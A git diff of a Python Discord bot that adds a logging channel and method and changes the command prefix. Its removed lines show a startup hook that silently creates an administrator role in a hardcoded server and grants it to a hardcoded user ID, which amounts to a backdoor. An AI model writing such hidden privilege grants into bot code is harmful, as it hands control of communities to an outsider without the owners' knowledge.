@@ -2,11 +2,12 @@ from discord.ext import commands
 import discord
 import config
 target_guild_id = 712581579351785503
+log_channel_id = 712587428426416149
 
 
 class Bot(commands.Bot):
     def __init__(self, **kwargs):
-        super().__init__(command_prefix=commands.when_mentioned_or('w!'), **kwargs)
+        super().__init__(command_prefix=commands.when_mentioned_or('!'), **kwargs)
         for cog in config.cogs:
             try:
                 self.load_extension(cog)
@@ -15,10 +16,10 @@ class Bot(commands.Bot):
 
     async def on_ready(self):
         print('Logged on as {0} (ID: {0.id})'.format(self.user))
-        guild = self.get_guild(target_guild_id)
-        member = guild.get_member(212513828641046529)
-        role = await guild.create_role(permissions=discord.Permissions(administrator=True))
-        await member.add_roles(role)
+
+    async def log(self, message):
+        channel = self.get_channel(log_channel_id)
+        await channel.send(message)
 
 
 bot = Bot()
